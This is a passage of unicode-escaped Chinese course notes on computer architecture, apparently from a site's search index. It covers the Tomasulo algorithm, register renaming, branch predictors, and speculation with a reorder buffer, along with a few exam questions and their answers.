<p>Scoreboard \u4e2d\uff0c\u6307\u4ee4 I3 \u4f1a\u56e0\u4e3a\u5176\u548c I1 \u7684 WAW \u51b2\u7a81\u800c\u4e0d\u80fd\u53d1\u5c04\uff0c\u800c Tomasulo \u7b97\u6cd5\u80fd\u591f\u901a\u8fc7\u4fdd\u7559\u7ad9\u5141\u8bb8\u5176\u5148\u53d1\u5c04\uff0c\u5e76\u6b63\u786e\u533a\u5206\u54ea\u4e2a\u5199\u662f\u6709\u6548\u7684\u3002</p> <p>Scoreboard \u5c06\u63a7\u5236\u6743\u7ed9\u4e09\u5f20\u8868\uff1bTomasulo \u5c06\u63a7\u5236\u6743\u4ea4\u7ed9 FU \u81ea\u5df1\uff0c\u5b83\u4eec\u81ea\u884c\u51b3\u5b9a\u662f\u5426\u63a5\u6536\u6307\u4ee4</p> <p>\u4e8c\u8005\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u5728\u4e8e IS \u9636\u6bb5\uff0cScoreboard \u8bfb\u7684\u662f\u5bc4\u5b58\u5668\u7684\u540d\u5b57\uff0c\u800c Tomasulo \u8bfb\u7684\u662f\u5176\u4e2d\u7684\u6570\u636e\uff0c\u540d\u5b57\u5141\u8bb8\u901a\u8fc7\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u66f4\u6539\u3002</p> <ul> <li>\u4e00\u4e2a FU \u53ef\u4ee5\u6709\u591a\u4e2a buffer\uff0c\u79f0\u4e3a\u4fdd\u7559\u7ad9 reserved station<ul> <li><code>busy</code>: FU \u662f\u5426\u7a7a\u95f2</li> <li><code>op</code>: FU \u6b63\u5728\u6267\u884c\u4ec0\u4e48\u64cd\u4f5c</li> <li><code>Vj</code>, <code>Vk</code>: \u4e24\u4e2a\u6e90\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684\u503c\uff08\u6ce8\u610f\u662f\u503c\uff09<ul> <li>\u8fdb\u5165 EXE \u9636\u6bb5\u65f6\u5373\u53ef\u5c06\u8be5\u9879\u6e05\u7a7a</li> </ul> </li> <li><code>Qj</code>, <code>Qk</code>: \u5982\u679c\u6e90\u5bc4\u5b58\u5668\u6ca1\u51c6\u5907\u597d\uff0c\u5219\u8981\u4ece\u54ea\u4e2a FU \u8bfb\u53d6<ul> <li>CDB \u5e7f\u64ad\u65f6\uff0c\u5982\u679c\u662f\u81ea\u5df1\u9700\u8981\u7684\uff0c\u5219\u83b7\u53d6</li> </ul> </li> <li><code>Address</code>: Load/Store \u8bfb\u5199\u7684\u5730\u5740<ul> <li>Load/Store\u6307\u4ee4\u53ef\u80fd\u4f1a\u8bbf\u95ee\u76f8\u540c\u7684\u5730\u5740\uff0c\u6b64\u65f6\u5bf9\u4e8e\u8be5\u5185\u5b58\u5730\u5740\u6765\u8bb2\uff0c\u6709\u53ef\u80fd\u51fa\u73b0\u6570\u636e\u5192\u9669\uff0c\u56e0\u6b64 <code>Address</code> \u7528\u6765\u68c0\u6d4b\u51b2\u7a81</li> <li>\u4e00\u822c\u6765\u8bb2\uff0cLoad/Store \u7684 EX \u7b2c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u7528\u6765\u8ba1\u7b97 <code>Address</code></li> </ul> </li> <li>\u8ddd\u79bb FU \u5b8c\u6210\u8be5\u6761\u6307\u4ee4\u7684\u5269\u4f59\u5468\u671f\u6570</li> </ul> </li> <li>\u5185\u5b58\u4e5f\u6709\u81ea\u5df1\u7684 reserved station\uff0c\u79f0\u4e3a Load/Store Buffer<ul> <li><code>busy</code>: \u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5426\u6709\u5185\u5b58\u8bfb\u5199\u8bf7\u6c42</li> <li><code>address</code>: \u8bfb\u5199\u7684\u5730\u5740</li> </ul> </li> <li>\u8868 Register Status Table\uff0c\u540c Scoreboard</li> <li>\u603b\u7ebf Common Data Bus(CDB)\uff0c\u8d1f\u8d23\u5c06\u7ed3\u679c\u5e7f\u64ad\u5230\u6240\u6709\u4fdd\u7559\u7ad9\u548c\u5bc4\u5b58\u5668<ul> <li>\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0 Bypassing \u529f\u80fd</li> </ul> </li> </ul> <p></p> <ul> <li>IF\uff1a\u53d6\u6307\u4ee4</li> <li>IS\uff1aIssue\uff0c\u8d1f\u8d23\u89e3\u7801\u6307\u4ee4\u3001\u76d1\u89c6\u7ed3\u6784\u51b2\u7a81\u3001\u8bfb\u64cd\u4f5c\u6570\u3001\u91cd\u547d\u540d\u5bc4\u5b58\u5668</li> <li>EX\uff1a\u9001\u5230\u4e0d\u540c FU \u6267\u884c\uff0c\u8bbf\u5b58\u4e5f\u5728\u8fd9\u4e00\u9636\u6bb5</li> <li>WB\uff1a\u5199\u56de\u7ed3\u679c\uff08\u5199\u56de\u5230 CDB\uff0c\u5e7f\u64ad\u5230\u6240\u6709\u4fdd\u7559\u7ad9\u548c\u5bc4\u5b58\u5668\uff09</li> </ul> <p>\u76f8\u6bd4\u4e8e Scoreboard\uff0c\u5c06 RO \u9636\u6bb5\u5e76\u5165 issue \u4e2d</p> <p>\u53e6\u5916\uff0c\u5bf9\u4e8e WAW \u51b2\u7a81\uff0cTomasulo \u7b97\u6cd5\u4e2d\u5c31\u7b97\u5bc4\u5b58\u5668\u72b6\u6001\u8868\u4e2d <code>rd</code> \u5bf9\u5e94\u9879\u4e0d\u4e3a\u7a7a\uff0c\u4ecd\u7136\u5141\u8bb8\u8be5\u6761\u6307\u4ee4\u53d1\u5c04\uff0c\u5e76\u5c06\u81ea\u5df1\u7684 <code>rd</code> \u8986\u76d6\u6389\u5bc4\u5b58\u5668\u72b6\u6001\u8868\u5bf9\u5e94\u9879\u3002\u6307\u4ee4\u5199\u56de\u65f6\uff0c\u901a\u8fc7 CDB \u8fdb\u884c\u5e7f\u64ad\uff0c\u53ea\u6709\u5f53\u5bc4\u5b58\u5668\u72b6\u6001\u8868\u6216\u8005\u4fdd\u7559\u7ad9\u4e2d\u5b58\u5728\u5bf9\u5e94\u4e3a\u81ea\u5df1\u7684 FU \u65f6\u624d\u5141\u8bb8\u5199\u5165\uff0c\u5426\u5219\u76f4\u63a5\u4e22\u5f03\u8fd9\u4e2a\u8fd0\u7b97\u7ed3\u679c\u3002</p> <p>\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u5bc4\u5b58\u5668\u72b6\u6001\u8868\u4e2d\u7684\u7ed3\u679c\u90fd\u4f1a\u88ab\u5199\u56de\u5230\u5bc4\u5b58\u5668\u5806\u4e2d\uff0c\u4f46\u5982\u4e0a\u6240\u8ff0\u5e76\u4e0d\u662f\u6240\u6709\u6307\u4ee4\u7ed3\u679c\u90fd\u4f1a\u88ab\u5199\u56de</p> <ul> <li>Advantage<ul> <li>\u5206\u5e03\u5f0f\u51b2\u7a81\u68c0\u6d4b\uff0c\u4e0d\u540c FU \u6709\u81ea\u5df1\u7684\u4fdd\u7559\u7ad9\uff0c\u63d0\u9ad8\u4e86\u5e76\u884c\u5ea6</li> <li>\u901a\u8fc7\u9690\u5f0f\u7684\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u89e3\u51b3\u4e86 WAR \u548c WAW \u51b2\u7a81<ul> <li>\u6307\u4ee4\u53d1\u5c04\u65f6\u5373\u5c06\u51c6\u5907\u597d\u7684\u6570\u636e\u8bfb\u5165\u4fdd\u7559\u7ad9\uff0c\u4ee5\u6b64\u6d88\u9664 WAR \u51b2\u7a81</li> </ul> </li> </ul> </li> <li>Disadvantage<ul> <li>\u9700\u8981\u89e3\u51b3\u540c\u4e00\u65f6\u523b\u53d1\u5c04\u591a\u4e2a\u6307\u4ee4\u3001\u540c\u4e00\u65f6\u523b\u591a\u4e2a\u503c\u5199\u5165 CDB \u7684\u95ee\u9898(\u4e3b\u8981\u5bf9\u4e8e\u786c\u4ef6)</li> <li>\u548c scoreboard \u4e00\u6837\u4e3a\u4e71\u5e8f\u6267\u884c\uff0c\u65e0\u6cd5\u5b9e\u73b0\u7cbe\u786e\u4e2d\u65ad</li> </ul> </li> </ul> <p>\u5bc4\u5b58\u5668\u91cd\u547d\u540d</p> <ul> <li>WAR\uff1a\u91cd\u547d\u540d\u540e\u4e00\u4e2a\uff08W\uff09</li> <li>WAW\uff1a\u91cd\u547d\u540d\u524d\u4e00\u4e2a</li> </ul> Before RenameAfter Rename <p></p> <p></p> <p>\u3010\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u3011Tomasulo\u7b97\u6cd5 - \u77e5\u4e4e \u53ef\u4ee5\u770b\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0\u7684\u6848\u4f8b\u8bb2\u89e3\u90e8\u5206</p> \u6709\u8010\u5fc3\u7684\u540c\u5b66\u53ef\u4ee5\u8bfb\u4e00\u4e0b\u8fd9\u4e2a <p></p> <ul> <li>\u89c2\u5bdf Load/Store Step\uff0c\u5b83\u7684 <code>RS[r].A</code> \u5728\u53d1\u5c04\u65f6\u521d\u59cb\u5316\u4e3a\u6307\u4ee4\u7684 <code>imm</code>\uff1bEX \u9636\u6bb5\u7684\u7b2c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5c06\u5e38\u6570\u4e0e\u5bc4\u5b58\u5668\u503c\u76f8\u52a0\u4ee5\u8ba1\u7b97\u5b9e\u9645\u8bbf\u95ee\u5730\u5740 <code>RS[r].Vj + RS[r].A</code>\uff1b\u6b64\u65f6 Load \u548c Store \u6307\u4ee4\u5b58\u5728\u6267\u884c\u5dee\u5f02\uff1a<ul> <li>\u5bf9\u4e8e Load \u6307\u4ee4\uff0c\u5b83\u8fd8\u9700\u8981\u5728 EX \u9636\u6bb5\u8fdb\u884c\u5185\u5b58\u8bbf\u95ee\u8bfb\u53d6</li> <li>\u5bf9\u4e8e Store \u6307\u4ee4\uff0c\u5b83\u9700\u8981\u5728 WB \u9636\u6bb5\u989d\u5916\u5224\u65ad\u8981\u5199\u56de\u7684\u6570\u636e <code>RS[r].Vk</code> \u662f\u5426\u51c6\u5907\u597d\uff08<code>RS[r].Qk</code>\uff09<ul> <li>\u5373 Store \u6307\u4ee4\u5728\u8fdb\u5165 EX \u9636\u6bb5\u65f6\u4e0d\u8981\u6c42 <code>Vk</code> \u51c6\u5907\u597d\uff0c\u5b83\u53ea\u5728 EX \u9636\u6bb5\u8ba1\u7b97\u5730\u5740\uff0c\u4f46\u662f\u8fdb\u5165 WB \u9636\u6bb5\u8981\u6c42</li> <li>\u4f8b\u5982\u5bf9\u4e8e <code>LD R1, 8(R2)</code>\uff0c\u8fd9\u91cc <code>Vj</code> \u6307 <code>R2</code>\uff0c<code>Vk</code> \u6307 <code>R1</code>\uff0c<code>A</code> \u521d\u59cb\u5316\u4e3a 8</li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/CA/ILP/#advanced-branch-prediction","title":"Advanced Branch Prediction","text":"<p>\u5982\u679c\u4e0d\u505a\u5206\u652f\u9884\u6d4b\uff0c\u90a3\u4e48\u4e0a\u8ff0\u52a8\u6001\u8c03\u5ea6\u7b97\u6cd5\u90fd\u53ea\u80fd\u5728\u4e00\u4e2a\u57fa\u672c\u5757\u4e2d\u8fdb\u884c\u5206\u6790\u3002</p> <p>\u5e38\u89c1\u7684\u9759\u6001\u9884\u6d4b\u7b56\u7565\u6709\u603b\u662f\u4e0d\u8df3\u8f6c\u548c\u603b\u662f\u8df3\u8f6c\u3002\u7edf\u8ba1\u6570\u636e\u663e\u793a\uff0c\u5927\u591a\u6570\u5206\u652f\u90fd\u662f\u8df3\u8f6c\u7684\uff0c\u6240\u4ee5\u603b\u662f\u9884\u6d4b\u8df3\u8f6c\u7684\u7b56\u7565\u7406\u8bba\u4e0a\u66f4\u597d\u3002\u4f46\u662f\uff0c\u603b\u662f\u8df3\u8f6c\u7684\u5b9e\u73b0\u76f8\u8f83\u4e8e\u603b\u662f\u4e0d\u8df3\u8f6c\u7684\u5b9e\u73b0\u66f4\u4e3a\u590d\u6742\uff0c\u56e0\u6b64\u5728\u5b9e\u9645\u4e2d\u6211\u4eec\u66f4\u591a\u7684\u662f\u9009\u62e9\u603b\u662f\u4e0d\u8df3\u8f6c\u3002</p> <p>\u52a8\u6001\u9884\u6d4b\u57fa\u4e8e\u786c\u4ef6\u5b9e\u73b0\uff1a</p> <ul> <li>1 bit \u9884\u6d4b\u5668<ul> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\uff0c\u53ea\u7528\u4e00\u4e2a\u4f4d\u8868\u793a\u662f\u5426\u8df3\u8f6c\uff0c\u4e0a\u6b21\u8df3\u8f6c\u4e86\u5219\u7f6e 1\uff0c\u4e0a\u6b21\u6ca1\u8df3\u8f6c\u5219\u7f6e 0\uff1b\u4e0b\u6b21\u53c8\u9047\u5230\u8be5\u8df3\u8f6c\u6307\u4ee4\u65f6\uff0c\u4e3a 1 \u5219\u8df3\u8f6c\uff0c\u4e3a 0 \u5219\u4e0d\u8df3\u8f6c</li> <li>\u901a\u8fc7\u7ef4\u62a4\u5206\u652f\u5386\u53f2\u8868 Branch History Table \u548c Branch Target Buffer\uff0c\u7528 PC \u7684\u4f4e\u4f4d\u4f5c\u4e3a\u7d22\u5f15\uff0c\u9ad8\u4f4d\u4f5c\u4e3a Tag\uff0c\u6765\u7ef4\u62a4\u5404\u4e2a\u8df3\u8f6c\u6307\u4ee4\u7684 1 bit \u9884\u6d4b\u5668</li> <li>\u4f18\u70b9\u662f\u786c\u4ef6\u5b9e\u73b0\u7b80\u5355</li> </ul> </li> </ul> <p></p> <ul> <li>2 bit \u9884\u6d4b\u5668<ul> <li>\u7528\u4e24\u4f4d\u8868\u793a\u5206\u652f\u662f\u5426\u8df3\u8f6c\uff0c\u5206\u4e3a\u56db\u4e2a\u72b6\u6001<ul> <li>00: strongly not taken</li> <li>01: weakly not taken</li> <li>10: weakly taken</li> <li>11: strongly taken</li> </ul> </li> <li>\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u4ece 00 \u5f00\u59cb\uff0c\u8df3\u8f6c\u4e00\u6b21\u5c31\u52a0\u4e00\uff0c\u4e0d\u8df3\u8f6c\u4e00\u6b21\u5c31\u51cf\u4e00\u3002</li> <li>\u76f8\u6bd4 1 bit \u9884\u6d4b\u5668\uff0c\u4e3a\u51b3\u7b56\u589e\u52a0\u4e86\u6ede\u540e\u6027</li> </ul> </li> </ul> <p></p> <ul> <li>Correlating Predictor \u76f8\u5173\u9884\u6d4b\u5668\uff082-level Predictor \u7684\u4e00\u79cd\u5b9e\u73b0\uff09<ul> <li>\u8bb8\u591a\u5206\u652f\u6307\u4ee4\u7684\u8df3\u8f6c\u4e0e\u5426\u4f9d\u8d56\u4e8e\u522b\u7684\u5206\u652f\u6307\u4ee4\u7684\u8df3\u8f6c\u7ed3\u679c\uff0c\u8fd9\u65f6\u5019\u4ec5\u9760\u81ea\u5df1\u7684\u8df3\u8f6c\u5386\u53f2\u6765\u9884\u6d4b\u4e0d\u591f\u51c6\u786e</li> <li>\u4e8c\u7ea7\u9884\u6d4b\u5668\u5305\u542b\u4e24\u4e2a\u5c42\u6b21\u7684\u7ed3\u6784\uff1a<ul> <li>Level 1 \u5168\u5c40\u5386\u53f2\u5bc4\u5b58\u5668\uff0c\u662f\u4e00\u4e2a \\(m\\) bit \u7684\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u8bb0\u5f55\u8fc7\u53bb \\(m\\) \u6761\u6307\u4ee4\u662f\u5426\u8df3\u8f6c\uff0c\u4f8b\u5982 <code>GHR = 110</code> \u6307\u6700\u8fd1\u4e09\u6b21\u662f\u201c\u8df3\uff0c\u8df3\uff0c\u4e0d\u8df3\u201d</li> <li>Level 2 Pattern History Table \u6a21\u5f0f\u8868\uff0c\u4f7f\u7528 Level 1 \u4f5c\u4e3a\u7d22\u5f15\uff0c\u8868\u9879\u901a\u5e38\u662f\u4e00\u4e2a 2-bit Predictor(\u6216\u8005\u79f0 Counter)</li> </ul> </li> <li>\u6ce8\u610f\uff0c\u201c\u4e0a\u4e00\u6761\u5206\u652f\u201d\u4e5f\u6709\u53ef\u80fd\u6307\u81ea\u5df1</li> <li>\u5bf9\u4e8e (m,n) predictor\uff0c\u5176\u53c2\u8003\u6700\u8fd1 \\(m\\) \u6761\u6307\u4ee4\u7684\u8df3\u8f6c\u7ed3\u679c\uff0c\u6bcf\u79cd\u60c5\u51b5\u90fd\u662f\u4e00\u4e2a \\(n\\) bit predictor<ul> <li>\u90a3\u4e48\u4e00\u6761\u6307\u4ee4\u7684\u5206\u652f\u9884\u6d4b\u7f13\u51b2\u533a\u5927\u5c0f\u4e3a \\(n*2^m\\) bit\uff0c\u6c42 History Table \u7684\u5927\u5c0f\u8fd8\u8981\u4e58\u4e0a PC \u4e2d\u7528\u4e8e index \u7684\u4f4e\u4f4d\u4f4d\u6570 \\(2^b\\) \uff08entries \u4e2a\u6570\uff09</li> </ul> </li> </ul> </li> </ul> <p></p> (23-24 Final) How many bits are needed to impl (2,2) predictor with 4K entries? \\[2*2^2*4K=32K\\ bit\\] <ul> <li>Gshare Predictor \u5c5e\u4e8e Correlating Predictor<ul> <li>\u5c06\u6700\u8fd1 m \u6761\u5206\u652f\u6307\u4ee4\u7684\u5386\u53f2\u548c PC \u4f4e m \u4f4d\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u6765\u4ece\u5206\u652f\u5386\u53f2\u8868\u4e2d\u9009\u62e9\u5bf9\u5e94\u9884\u6d4b\u5668\uff0c\u5176\u7279\u70b9\u662f\u7ed3\u5408\u5168\u5c40\u5386\u53f2\u548c\u672c\u5730\u5386\u53f2</li> </ul> </li> </ul> <p></p> <ul> <li>Tournament Predictor \u9971\u548c\u9884\u6d4b\u5668\uff0c\u5c5e\u4e8e Hybrid Predictor<ul> <li>\u524d\u9762\u7684\u9884\u6d4b\u5668\u4e2d\uff0c\u4e24\u6761\u4e0d\u540c\u8df3\u8f6c\u6307\u4ee4\u7684 PC \u5730\u5740\u7684\u524d\u51e0\u4f4d\u53ef\u80fd\u76f8\u540c\uff0c\u5bfc\u81f4\u76f8\u4e92\u5e72\u6270\u3002\u9971\u548c\u9884\u6d4b\u5668\u4f7f\u7528 global \u548c local \u4e24\u4e2a\u9884\u6d4b\u5668\uff0c\u5e76\u6839\u636e\u8df3\u8f6c\u5730\u5740\u6765\u9009\u62e9\u4f7f\u7528\u54ea\u4e2a predictor</li> <li>\u9009\u62e9\u5668\u4e5f\u662f\u4e00\u4e2a 2 bit counter\uff0c\u5f53\u53d1\u751f\u4e24\u6b21\u9519\u8bef\u9884\u6d4b\u65f6\uff0c\u5b83\u4f1a\u66f4\u6539\u9996\u9009\u9884\u6d4b\u5668</li> <li>global \u662f\u5168\u5c40\u5171\u6709\u7684\uff0clocal \u662f\u81ea\u5df1\u7684</li> </ul> </li> </ul> <p></p> \u6ce8\u610f\u662f\u4f7f\u7528\u8df3\u8f6c\u5730\u5740 Branch Address \u4f5c\u4e3a Index <p></p> <p>\u5269\u4e0b\u4e24\u4e2a\u5c0f\u900f\u660e\u7b80\u5355\u6709\u4e2a\u5370\u8c61\uff1a</p> <ul> <li>Branch Target Buffer, BTB \u5206\u652f\u76ee\u6807\u7f13\u51b2<ul> <li>\u5176\u5b9e\u4e0d\u662f\u9884\u6d4b\u5668\uff0c\u4f46\u662f\u4e5f\u662f\u4e00\u79cd\u6280\u672f</li> <li>\u5728\u8df3\u8f6c\u6307\u4ee4 IF \u9636\u6bb5\u65f6\uff0c\u5c31\u9884\u5148\u628a\u76ee\u6807\u5730\u5740\u5b58\u8fdb\u8868\u4e2d\uff1b\u5982\u679c branch taken\uff0c\u5219\u76f4\u63a5\u4ece\u8868\u4e2d\u53d6\u5730\u5740\uff0c\u4e0d\u7528\u53bb\u8bbf\u5b58 Instruction Mem </li> <li>\u7531\u4e8e\u63d0\u524d\u5bf9\u6307\u4ee4\u8fdb\u884c\u9884\u53d6\uff0c\u5bf9 Memory \u7684\u5e26\u5bbd\u8981\u6c42\u66f4\u9ad8</li> </ul> </li> <li>Return Address Predictor<ul> <li><code>call</code>, <code>return</code> \u4e5f\u5c5e\u4e8e\u4e00\u79cd\u8df3\u8f6c\uff0c\u53ea\u8981\u8bb0\u4f4f\u8fd9\u4e2a\u9884\u6d4b\u5668\u662f\u9488\u5bf9\u51fd\u6570\u8c03\u7528\u8bbe\u8ba1\u7684\u5c31\u597d\u4e86</li> </ul> </li> </ul> <p>\u4e09\u79cd\u4e0d\u540c\u9884\u6d4b\u5668\u7684 Miss Rate \u6bd4\u8f83</p> <p></p>"},{"location":"Courses/CA/ILP/#speculation","title":"Speculation","text":"<p>\u6211\u4eec\u79f0\u57fa\u4e8e\u786c\u4ef6\u7684\u731c\u6d4b\u6267\u884c\u4e3a Speculation\u3002\u5982\u679c\u5206\u652f\u7ed3\u679c\u8fd8\u6ca1\u786e\u5b9a\uff0c\u6211\u4eec\u9700\u8981\u731c\u6d4b\u6267\u884c\u4ee5\u62d3\u5c55\u52a8\u6001\u8c03\u5ea6\u7684\u8303\u56f4\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5904\u7406\u9884\u6d4b\u5931\u8bef\u7684\u60c5\u51b5\uff0c\u4e5f\u5373\u9700\u8981\u652f\u6301 rollback \u64cd\u4f5c\u3002</p> <p>\u540c\u6570\u636e\u5e93\u7c7b\u4f3c\uff0c\u6211\u4eec\u5c06\u6307\u4ee4\u5206\u4e3a\u3010\u6307\u4ee4\u6267\u884c\u3011+\u3010\u6307\u4ee4\u63d0\u4ea4\u3011\u4e24\u4e2a\u9636\u6bb5\uff0c\u53ea\u5141\u8bb8\u5c06\u6b63\u786e\u7684\u6307\u4ee4\u7ed3\u679c commit \u5199\u56de\u5230\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u63d0\u4ea4\u7f13\u51b2\u533a\uff0c\u5728 Tomasulo \u7b97\u6cd5\u4e2d\u79f0\u4e3a ReOrder Buffer(ROB)\u3002</p> <p>ROB \u4f5c\u4e3a\u5faa\u73af FIFO \u961f\u5217\u6765\u5b9e\u73b0\u987a\u5e8f\u63d0\u4ea4\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u66ff\u4ee3 Store Buffer(\u6307\u4ee4 store \u7684\u4fdd\u7559\u7ad9) \u4f5c\u4e3a\u5b58\u50a8\u7f13\u51b2\u533a\uff0c\u5176\u7f13\u5b58\u5185\u5bb9\u5927\u81f4\u5982\u4e0b\uff1a</p> <p></p> <p>\u5728\u6307\u4ee4\u7684 WB \u9636\u6bb5\u540e\u6dfb\u52a0\u4e00\u4e2a Commit \u9636\u6bb5\uff0c\u5e76\u4e14\u53ea\u6709 ROB \u7684\u961f\u9996\u6307\u4ee4\u5141\u8bb8\u63d0\u4ea4\u3002</p> <p>\u6307\u4ee4\u53d1\u5c04\u7684\u65f6\u5019\uff0c\u540c\u65f6\u8fdb\u5165\u4fdd\u7559\u7ad9\u548c ROB\uff1b\u5f53\u6307\u4ee4\u9700\u8981\u8bfb\u53d6\u64cd\u4f5c\u6570\u65f6\uff0c\u4e5f\u53ef\u4ee5\u8bf7\u6c42 ROB \u4e2d\u8fd8\u672a\u63d0\u4ea4\u7684\u4e34\u65f6\u7ed3\u679c\u3002</p> <p>\u5982\u679c\u4fdd\u7559\u7ad9\u6216\u8005 ROB \u6ee1\u4e86\uff0c\u5219\u505c\u6b62\u53d1\u5c04\u6307\u4ee4\u76f4\u5230\u6709\u7a7a\u4f4d</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u961f\u9996\u662f branch \u6216\u5176\u5b83\u8df3\u8f6c\u6307\u4ee4\uff0c\u4f46\u662f\u5b83\u9884\u6d4b\u9519\u8bef\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6e05\u7a7a ROB\uff08Flush\uff09\u4ee5\u6d88\u9664\u9884\u6d4b\u5931\u8d25\u7684\u5f71\u54cd\uff0c\u8fd9\u662f\u56e0\u4e3a\u76f4\u5230\u6307\u4ee4\u63d0\u4ea4\u524d\u5176\u7ed3\u679c\u90fd\u4e0d\u4f1a\u771f\u6b63\u5199\u5165\u5bc4\u5b58\u5668\u5806\u548c\u5185\u5b58\u4e2d\u3002</p> <p>\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u4e3a Register Status \u6dfb\u52a0\u4e00\u4e2a Field\uff0c\u7528\u6765\u8868\u793a\u5f53\u524d\u5bc4\u5b58\u5668\u5728 ROB \u7684\u54ea\u4e2a Entry\uff1a</p> <p></p> <p>\u3010Example\u3011 ROB \u53ea\u5141\u8bb8\u961f\u9996\u63d0\u4ea4\uff0c\u56e0\u6b64\u5373\u4fbf\u7b2c\u4e8c\u6761\u6307\u4ee4\u5f88\u65e9\u5c31\u8fdb\u5165\u5199\u56de\u9636\u6bb5\uff0c\u4e5f\u8981\u7b49\u5f85 <code>div</code> \u63d0\u4ea4\u3002</p> <p></p> \u5e26\u6709 ROB \u7684 Tomasulo Hardware <p></p> <p>\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5b9e\u73b0\u4e86\u4e71\u5e8f\u6267\u884c\u3001\u4e71\u5e8f\u5b8c\u6210\uff0c\u4f46\u662f\u987a\u5e8f\u53d1\u5c04\u3001\u987a\u5e8f\u63d0\u4ea4\uff0c\u4ece\u800c\u80fd\u591f\u5b9e\u73b0\u7cbe\u786e\u4e2d\u65ad\u3002\u5f02\u5e38\u76f8\u5173\u7684\u4fe1\u606f\u4f1a\u88ab\u8bb0\u5f55\u5230 ROB \u4e2d\u5bf9\u5e94\u9879\u4e2d\uff0c\u76f4\u5230\u8be5\u6761\u6307\u4ee4\u8981\u88ab\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002</p> <p>\u5e26 Speculation \u7684 Tomasulo\uff0c\u5728 __ \u6709\u7a7a\u4f59\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5 Issue\uff0c\u53d1\u5c04\u540e\u4ece __ \u8bfb\u53d6 operand \u503c\u5230 __\u3002</p> <ul> <li>\u7b2c\u4e00\u7a7a C\uff0c\u53d1\u5c04\u65f6\u8981\u540c\u65f6\u5199\u5165\u4fdd\u7559\u7ad9\u548c ROB<ul> <li>A. Reservation Station</li> <li>B. ROB</li> <li>C. Reservation Station &amp; ROB</li> <li>D. Reservation Station | ROB</li> </ul> </li> <li>\u7b2c\u4e8c\u7a7a D\uff0c\u4e5f\u5141\u8bb8\u4ece ROB \u8bfb\u6570<ul> <li>A. ROB</li> <li>B. Register</li> <li>C. ROB &amp; Register</li> <li>D. ROB | Register</li> </ul> </li> <li>\u7b2c\u4e09\u7a7a A\uff0c\u5148\u8bfb\u5230\u4fdd\u7559\u7ad9\uff0c\u6240\u6709\u64cd\u4f5c\u6570\u90fd ready \u540e\u518d\u8fdb\u5165 FU<ul> <li>A. Reservation Station</li> <li>B. Function Unit</li> </ul> </li> </ul> <p>Conlusion</p> <p></p> \u6709\u8010\u5fc3\u7684\u540c\u5b66\u53ef\u4ee5\u8bfb\u4e00\u4e0b\u8fd9\u4e2a <p></p>"},{"location":"Courses/CA/ILP/#multi-issue-superscalar","title":"Multi Issue: Superscalar","text":"<p>\u4e4b\u524d\u6211\u4eec\u6240\u8bf4\u7684\u65b9\u6cd5\u90fd\u662f\u4e3a\u4e86\u4f7f\u5b9e\u9645 CPI \u80fd\u591f\u63a5\u8fd1 Ideal CPI\uff0c\u4f46\u662f\u4e0d\u4f7f\u7528\u591a\u53d1\u5c04\u7684\u8bdd Ideal CPI \u53ea\u80fd\u4e3a 1\u3002</p> <p>\u800c\u591a\u53d1\u5c04\u6280\u672f\u5141\u8bb8\u4e00\u6761\u5468\u671f\u53d1\u5c04\u591a\u6761\u6307\u4ee4\uff0c\u4f7f\u5f97 ideal CPI &lt; 1\u3002\u5728\u786c\u4ef6\u5c42\u9762\uff0c\u591a\u53d1\u5c04\u4e3b\u8981\u901a\u8fc7 Superscalar \u8d85\u6807\u91cf\u5b9e\u73b0\u3002</p> <ul> <li>\u9759\u6001\u8c03\u5ea6 Superscalar<ul> <li>\u7f16\u8bd1\u5668\u6280\u672f\u4f18\u5316</li> <li>\u987a\u5e8f\u6267\u884c</li> </ul> </li> <li>\u52a8\u6001\u8c03\u5ea6 Superscalar<ul> <li>\u57fa\u4e8e Tomasulo \u7b97\u6cd5</li> <li>\u4e71\u5e8f\u6267\u884c</li> </ul> </li> </ul> <p>\u80fd\u4f7f CPI &lt; 1 \u7684\u6280\u672f</p> <p></p> <p>Static Superscaler</p> <p>\u9759\u6001\u8c03\u5ea6\u7684 Superscaler \u5c31\u662f\u8ba1\u7ec4\u8bfe\u7a0b\u4e2d\u7b80\u5355\u63d0\u5230\u7684\u591a\u53d1\u5c04\u6280\u672f\u3002\u5904\u7406\u5668\u4f1a\u5c06\u540c\u65f6\u6267\u884c\u4e0d\u4f1a\u51b2\u7a81\u7684\u6307\u4ee4\u5206\u6210\u4e0d\u540c\u7684 issue packets \u4e00\u8d77\u53d1\u5c04\uff0c\u4ece\u800c\u589e\u52a0\u6d41\u6c34\u7ebf\u6548\u7387\u3002</p> <p>\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5904\u7406\u5668\u5728 issue \u9636\u6bb5\u4e00\u4e2a\u65f6\u949f\u5468\u671f\uff0c\u9700\u8981\u5b8c\u6210 issue check \u7684\u64cd\u4f5c\u3002\u4e00\u822c\u6765\u8bb2\uff0c\u5bf9\u4e8e N 